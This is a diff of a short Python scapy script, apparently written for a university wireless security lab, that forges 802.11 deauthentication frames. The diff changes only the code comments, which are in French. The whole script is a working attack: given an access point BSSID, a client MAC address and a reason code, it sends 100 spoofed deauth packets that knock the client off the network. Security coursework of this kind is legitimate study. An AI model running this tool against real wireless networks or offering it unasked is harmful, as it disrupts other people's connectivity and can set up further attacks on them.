@@ -8,22 +8,22 @@ from scapy.all import conf, sendp
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 import argparse
 
-# Param nécessaire (à remplir) permettant de lancer l'attaque
+# Paramètres nécessaires pour l'envoi du paquet
 parser = argparse.ArgumentParser(prog="Scapy deauth", description="Deauth script for SWI LAB")
 
-parser.add_argument("-a", "--bssid", required=True)
-parser.add_argument("-c", "--client", required=True)
-parser.add_argument("-i", "--interface", required=True)
-parser.add_argument("-r", "--code", required=True, choices=['1', '4', '5', '8'])
+parser.add_argument("-a", "--bssid", required=True) # BSSID de l'AP
+parser.add_argument("-c", "--client", required=True) # Adresse MAC de la station
+parser.add_argument("-i", "--interface", required=True) # Interface d'envoi
+parser.add_argument("-r", "--code", required=True, choices=['1', '4', '5', '8']) # Code de raison
 args = parser.parse_args()
 
 toSta = [1,4,5]
 if int(args.code) in toSta:
-    dot11 = Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid)
+    dot11 = Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid) # De l'AP vers la station
 if int(args.code) == 8:
-    dot11 = Dot11(addr1=args.bssid, addr2=args.client, addr3=args.client)
+    dot11 = Dot11(addr1=args.bssid, addr2=args.client, addr3=args.client) # De la station vers l'AP
 
-# stack them up 
+# Création du paquet
 packet = RadioTap() / dot11 / Dot11Deauth(reason=int(args.code))
-# send the packet
+# Envoi du paquet
 sendp(packet, inter=0.1, count=100, iface=args.interface, verbose=1)
